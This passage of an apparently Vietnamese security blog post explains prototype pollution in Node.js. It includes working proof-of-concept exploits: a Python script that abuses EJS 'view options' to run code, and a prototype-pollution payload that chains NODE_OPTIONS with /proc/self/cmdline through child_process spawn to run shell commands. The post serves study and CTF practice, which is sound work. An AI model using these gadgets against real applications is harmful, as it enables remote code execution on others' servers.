+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h1>
+
+<ul>
+<li>Sẽ ra sao nếu ta không có prototype pollution nhưng có thể handle được biến data ?
+Khi express gọi tới render bản chất nó sẽ gọi tới <strong>export.__express</strong></li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-js">   // default engine export
+    var fn = require(mod).__express
+</code></pre>
+<p>Ejs :</p>
+<pre  class="mc-prism hide language-text" ><code class="language-js">/**
+ * Express.js support.
+ *
+ * This is an alias for {@link module:ejs.renderFile}, in order to support
+ * Express.js out-of-the-box.
+ *
+ * @func
+ */
+
+exports.__express = exports.renderFile;
+
+</code></pre>
+<p>Vậy bản chất của express sẽ gọi tới hàm renderFile :</p>
+<pre  class="mc-prism hide language-text" ><code class="language-js">
+exports.renderFile = function () {
+  var args = Array.prototype.slice.call(arguments);
+  var filename = args.shift();
+  var cb;
+  var opts = { filename: filename };
+  var data;
+  var viewOpts;
+
+  // Do we have a callback?
+  if (typeof arguments[arguments.length - 1] == 'function') {
+    cb = args.pop();
+  }
+  // Do we have data/opts?
+  if (args.length) {
+    // Should always have data obj
+    data = args.shift();
+    // Normal passed opts (data obj + opts obj)
+    if (args.length) {
+      // Use shallowCopy so we don't pollute passed in opts obj with new vals
+      utils.shallowCopy(opts, args.pop());
+    }
+    // Special casing for Express (settings + opts-in-data)
+    else {
+      // Express 3 and 4
+      if (data.settings) {
+        // Pull a few things from known locations
+        if (data.settings.views) {
+          opts.views = data.settings.views;
+        }
+        if (data.settings['view cache']) {
+          opts.cache = true;
+        }
+        // Undocumented after Express 2, but still usable, esp. for
+        // items that are unsafe to be passed along with data, like `root`
+        viewOpts = data.settings['view options'];
+        if (viewOpts) {
+          utils.shallowCopy(opts, viewOpts);
+        }
+      }
+      // Express 2 and lower, values set in app.locals, or people who just
+      // want to pass options in their data. NOTE: These values will override
+      // anything previously set in settings  or settings['view options']
+      utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS);
+    }
+    opts.filename = filename;
+  }
+  else {
+    data = utils.createNullProtoObjWherePossible();
+  }
+
+  return tryHandleCache(opts, data, cb);
+};
+</code></pre>
+<p>Hàm này khá tương đồng với hàm render bình thường nhưng sẽ có vài điểm đặc biệt đó là :</p>
+<pre  class="mc-prism hide language-text" ><code class="language-js">        viewOpts = data.settings['view options'];
+        if (viewOpts) {
+          utils.shallowCopy(opts, viewOpts);
+        }
+</code></pre>
+<ul>
+<li>Ta có thể thấy ở đây , data có thể ảnh hưởng trực tiếp tới biến <strong>opts</strong>  và từ đó chẳng khác gì ta có thể kiểm soát biển opts và lấy rce .</li>
+</ul>
+
+<h3 id="poc--1" class="header-anchor-wrapper">POC :
+  <a href="#poc--1" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h3>
+
+<p>server.js :</p>
+<pre  class="mc-prism hide language-text" ><code class="language-js">const express = require('express');
+const path = require('path');
+
+const bodyParser = require('body-parser');
+
+const app = express();
+app.use(bodyParser.json());
+
+
+// Set EJS as the template engine
+app.set('view engine', 'ejs');
+
+// Set the views directory
+app.set('views', path.join(__dirname, 'views'));
+
+app.post(&quot;/pollute_me&quot;, (req, res) =&gt; {
+    // Prototype pollution vulnerability here
+    const data = { title: 'Hello EJS', message: 'Welcome to EJS Template!' }
+    Object.assign(data, req.body);
+    res.render('index', data)
+})
+// Define a simple route
+app.get('/', (req, res) =&gt; {
+    res.render('index', { title: 'Hello EJS', message: 'Welcome to EJS Template!' });
+});
+
+// Start the server
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () =&gt; {
+    console.log(`Server running on http://localhost:${PORT}`);
+});
+
+</code></pre>
+<p>ex.py :</p>
+<pre  class="mc-prism hide language-text" ><code class="language-js">import  requests
+url = &quot;http://localhost:3000&quot;
+escapeFunction = &quot;JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());&quot;
+data  = { 
+    &quot;settings&quot; : {
+        &quot;view options&quot; : {
+         &quot;client&quot; : '123' ,
+        &quot;escapeFunction&quot; : escapeFunction       
+        }
+    }
+}
+res = requests.post(url+'/pollute_me' ,json=data)
+print(res.text)
+requests.get(url)
+
+</code></pre>
+<ul>
+<li><strong>Lưu ý</strong>:  gadget trên chỉ hoạt động khi kiểm soát được property trực tiếp của data chứ không phải proottype pollution vì khi parse <strong>renderOptions</strong> , nó chỉ copy các own property thui chứ không dùng luôn cả objects đấy.</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-js">var renderOptions = { ...this.locals, ...opts._locals, ...opts };
+</code></pre>
+
+<h1 id="how-it-get-patched" class="header-anchor-wrapper">How it get patched
+  <a href="#how-it-get-patched" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h1>
+
+<ul>
+<li>Vì root cause ở đây là do hàm generate Template function nhận opts mà không kiểm tra kĩ nên patch đơn giản nhưu sau  :
+<a href="https://github.com/mde/ejs/compare/v3.1.9%2e%2e%2ev3.1.10">https://github.com/mde/ejs/compare/v3.1.9%2e%2e%2ev3.1.10</a>
+<img alt="image" src="https://hackmd.io/_uploads/BJ7m3GkOee.png"></li>
+</ul>
+<p>Nó sẽ kiểm tra các biến có phải là property trực tiếp hay không sau đó trả copy vào một Null Object và returns về . Không biết có bypass đc ko :v
+Nhìn chung nếu ta có thể kiểm soát biến data (not prototype pollution) thì rce vẫn posssible .</p>
+
+<h1 id="một-vài-điểm-thú-vị-về-for-in-" class="header-anchor-wrapper">Một vài điểm thú vị về for in :
+  <a href="#m%e1%bb%99t-v%c3%a0i-%c4%91i%e1%bb%83m-th%c3%ba-v%e1%bb%8b-v%e1%bb%81-for-in-" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h1>
+
+<p>Xét ví dụ sau :</p>
+<pre  class="mc-prism hide language-text" ><code class="language-js">scripts = {
+    &quot;pace&quot;: &quot;https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js&quot;,
+    &quot;main&quot;: &quot;/main.js&quot;,
+}
+
+Object.prototype.polluted = &quot;WTF&quot;
+console.log(&quot;Just log it out : &quot;, scripts)
+
+for (let script in scripts) {
+    console.log(&quot;[&quot; + script + &quot;] =&gt; &quot; + scripts[script])
+}
+</code></pre>
+<p>Kết quả sẽ có chứa polluted không ? Câu trả lời là có   :
+<img alt="image" src="https://hackmd.io/_uploads/H1jr8KJ_gl.png">
+Đọc tí document về tính chất của for in ta có thể thấy rằng <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Enumerability_and_ownership_of_properties">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Enumerability_and_ownership_of_properties</a>
+<img alt="image" src="https://hackmd.io/_uploads/ry2vUFJuxl.png">
+Nó sẽ chấp nhận luôn cả những enumerable là inherited từ Object prototype ! Bài này mình thấy ở malta ctf khá hay  (mặc dù mình k giải ra:( )</p>
+
+<h1 id="universal-gadget" class="header-anchor-wrapper">Universal Gadget
+  <a href="#universal-gadget" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h1>
+
+<p><a href="https://portswigger.net/web-security/prototype-pollution/server-side">https://portswigger.net/web-security/prototype-pollution/server-side</a></p>
+<ul>
+<li>Ngoài ra có một gadget khá nguy hiểm đối với các phiên bản Node js cũ khi spawn một process mới .</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-js">function spawn(file, args, options) {
+    const child = new ChildProcess();
+
+    options = normalizeSpawnArguments(file, args, options);
+    debug('spawn', options);
+    child.spawn(options);
+
+    return child;
+}
+
+</code></pre>
+<p>Hàm trên sẽ tạo một process và truyền options được lấy từ <strong>normalizeSpawnArguments</strong>
+Vấn đề ở đây là hàm trên có một bug về pp .</p>
+<pre  class="mc-prism hide language-text" ><code class="language-j">    const env = options.env || process.env;
+    const envPairs = [];
+    // Prototype values are intentionally included.
+    for (const key in env) {
+        const value = env[key];
+        if (value !== undefined) {
+            envPairs.push(`${key}=${value}`);
+        }
+    }
+ return {
+        // Make a shallow copy so we don't clobber the user's options object.
+        ...options,
+        args,
+        detached: !!options.detached,
+        envPairs,
+        file,
+        windowsHide: !!options.windowsHide,
+        windowsVerbatimArguments: !!windowsVerbatimArguments
+    };
+</code></pre>
+<ul>
+<li>Như ta đã biết vòng for in ở đây sẽ loop qua cả các prototype và dường như điều này đã được các developer intend nhưng mà không hiểu sao lại intend v nữa : )</li>
+<li>Vậy spawn một process mới và kiểm soát được options thì ta có thể làm được gì ? Có một options khá thú vị nếu như ta spawn một <strong>node</strong> process .
+Đó là NODE_OPTIONS : <a href="https://nodejs.org/api/cli.html#node_optionsoptions">https://nodejs.org/api/cli.html#node_optionsoptions</a>
+<img alt="image" src="https://hackmd.io/_uploads/SyeQrpZOll.png">
+Và ta có thể thấy  :
+<img alt="image" src="https://hackmd.io/_uploads/HymIrpWugx.png">
+Kết hợp điều này với gadget trên thì ta có thể dễ dàng lấy RCE . Vậy làm sao có thể làm được khi ta không có thể tạo file ? Ta có thể lợi dụng các file đặc biệt như /proc/self/environ như ví dụ ở Kibana nhưng điều này đã bị chặn và không còn khả thi  vì node js đã fixx lỗi này và luôn đặt environ ở cuối cùng.</li>
+<li>Vậy là sao để bypass  ?
+Ta sẽ lợi dụng một file đặc biệt là file <strong>/proc/self/cmdline</strong> là file sẽ trả về argv[0] ví dụ  :</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-js">const { spawn } = require(&quot;child_process&quot;);
+
+const ls = spawn(&quot;node&quot;, [&quot;rce.js&quot;], {
+    env: {
+        ...process.env, // inherit parent env
+    },
+    stdio: &quot;inherit&quot;  // pipe output directly to parent terminal
+});
+
+</code></pre>
+<p>rce.js :</p>
+<pre  class="mc-prism hide language-text" ><code class="language-js">const fs = require(&quot;fs&quot;);
+
+const cmdline = fs.readFileSync(&quot;/proc/self/cmdline&quot;);
+console.log(cmdline.toString().split(&quot;\0&quot;));
+
+</code></pre>
+<p>Khi này ta sẽ thấy argv[0] tương đương với &rsquo;node&rsquo;  :<br>
+<img alt="image" src="https://hackmd.io/_uploads/H1byy0b_ee.png"></p>
+<ul>
+<li>Và điều đặc biệt là spawn function có hỗ trợ chức năng set argv[0] mà không làm thay đổi executable file .
+<img alt="image" src="https://hackmd.io/_uploads/By5WyR-Oxx.png"></li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-js">const { spawn } = require(&quot;child_process&quot;);
+
+const ls = spawn(&quot;node&quot;, [&quot;rce.js&quot;], {
+    argv0: &quot;abc&quot;,
+    env: {
+        ...process.env, // inherit parent env
+    },
+    stdio: &quot;inherit&quot;  // pipe output directly to parent terminal
+});
+</code></pre>
+<p><img alt="image" src="https://hackmd.io/_uploads/HJzVkCZdgg.png">
+Kết hợp điều này với NODE_OPTIONS và /proc/self/cmdline ta có payload như sau  :+1:</p>
+<pre  class="mc-prism hide language-text" ><code class="language-js">const { spawn } = require(&quot;child_process&quot;);
+
+const ls = spawn(&quot;node&quot;, [&quot;rce.js&quot;], {
+    argv0: &quot;console.log(123);//&quot;,
+    env: {
+        ...process.env, // inherit parent env
+        NODE_OPTIONS: &quot;--require /proc/self/cmdline&quot;
+    },
+    stdio: &quot;inherit&quot;  // pipe output directly to parent terminal
+});
+</code></pre>
+<p><img alt="image" src="https://hackmd.io/_uploads/S1hLy0bOxg.png"></p>
+<ul>
+<li>Cuối cùng kết hợp với prototype pollution thì ta sẽ dễ dàng có được rce .</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-js">const { spawn } = require(&quot;child_process&quot;);
+
+Object.prototype.env = {}; // dummy object
+Object.prototype.env.NODE_OPTIONS = &quot;--require /proc/self/cmdline&quot;; // trigger loadJ
+Object.prototype.argv0 = `require(&quot;child_process&quot;).execSync(&quot;id &gt; pwn&quot;);//`;
+
+spawn(&quot;node&quot;);
+</code></pre>
+<p><img alt="image" src="https://hackmd.io/_uploads/SkbvVAZugg.png"></p>
+
+<h1 id="so-sánh-__proto__-và-constructorprototype" class="header-anchor-wrapper">So sánh _<em>proto</em>_ và constructor.prototype?
+  <a href="#so-s%c3%a1nh-__proto__-v%c3%a0-constructorprototype" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h1>
+
+<p>Như mọi người ai cũng biết là khi làm prototype pollution ta thường dùng các key như &ldquo;<strong>proto</strong>&rdquo; hay &ldquo;constructor.prototype&rdquo; để access được Object.prototype nhưng vì sao lại như vậy ?</p>
+
+<h2 id="constructorprototype-" class="header-anchor-wrapper">Constructor.prototype :
+  <a href="#constructorprototype-" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<ul>
+<li>Ta có thể hiểu đơn giản là lấy prototype của constructor đó .
+Nhìn vào đoạn code sau :</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-js">    const a = {} ;
+// Tương đương với
+    const a = Object.create(Object.prototype)
+    
+</code></pre>
+<p><img alt="image" src="https://hackmd.io/_uploads/rJeswK1ugl.png"></p>
+<ul>
+<li>Hàm Object.create sẽ tạo một object và sử dụng một Object đang tồn tại làm prototype cho chúng và lưu vào __proto__ .</li>
+<li>Còn constructor là trỏ về object và lấy prootytpe của Object . Nên vô tình sẽ khiến cho __proto__ == Object.prototype</li>
+</ul>
+
+<h2 id="__proto__" class="header-anchor-wrapper">__proto__
+  <a href="#__proto__" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<ul>
+<li>Sẽ có các trường hợp __proto__ sẽ khác với constructor.prototype như :
+<img alt="image" src="https://hackmd.io/_uploads/rykrdYyOlx.png"></li>
+<li>Ví dụ trên trang chính vậy. Khi này __proto__ == person.
+<img alt="image" src="https://hackmd.io/_uploads/B1guOY1Oxg.png"></li>
+<li>Còn constructor của nó vẫn là Object nên đơn giản trả về Object prototype
+<img alt="image" src="https://hackmd.io/_uploads/BJH5Ot1Oxl.png"></li>
+</ul>
+
+<h1 id="các-method-để-lấy-prototype" class="header-anchor-wrapper">Các method để lấy Prototype
+  <a href="#c%c3%a1c-method-%c4%91%e1%bb%83-l%e1%ba%a5y-prototype" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h1>
+
+<ul>
+<li>Cái nì mình tóm tắt trick lỏ lấy được từ X thôi :v
+<a href="https://x.com/arkark_/status/1943260773268230205?s=46">https://x.com/arkark_/status/1943260773268230205?s=46</a>
+<img alt="8219bfac-78cd-4b0e-9186-92f075010cd6" src="https://hackmd.io/_uploads/HyXNttk_lg.jpg"></li>
+</ul>
+
+<h1 id="challenges-" class="header-anchor-wrapper">Challenges :
+  <a href="#challenges-" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h1>
+
+<ul>
+<li>Mình có làm một challenge nhỏ , mọi người có thể chơi thử và nếu có thắc mắc thì có thể DM mình nhé :
+<a href="https://drive.google.com/file/d/14RMwQ2WIy2g1zQl3mAE1PT7ikJkPh1zs/view?usp=sharing">https://drive.google.com/file/d/14RMwQ2WIy2g1zQl3mAE1PT7ikJkPh1zs/view?usp=sharing</a></li>
+<li>Lần đầu mình làm chall nên chắc sẽ có nhiều bug unintend đấy :v</li>
+</ul>
+
+<h1 id="resource-" class="header-anchor-wrapper">Resource :
+  <a href="#resource-" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h1>
+
+<p><a href="https://nodejs.org/api/cli.html#cli_node_options_options">https://nodejs.org/api/cli.html#cli_node_options_options</a>
+<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Inheritance_and_the_prototype_chain#prototype_and_object.getprototypeof">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Inheritance_and_the_prototype_chain#prototype_and_object.getprototypeof</a>
+<a href="https://www.sonarsource.com/blog/blitzjs-prototype-pollution/">https://www.sonarsource.com/blog/blitzjs-prototype-pollution/</a>
+<a href="https://www.usenix.org/system/files/usenixsecurity23-shcherbakov.pdf">https://www.usenix.org/system/files/usenixsecurity23-shcherbakov.pdf</a>
+<a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/</a></p>
+
+</article>
+</div>
+   
+      </div>
+    </main>
+<footer>
+    <article>Copyright © 2025 by 3HLD Team | v1.0</article>
+</footer>
+
+</body>
+</html>
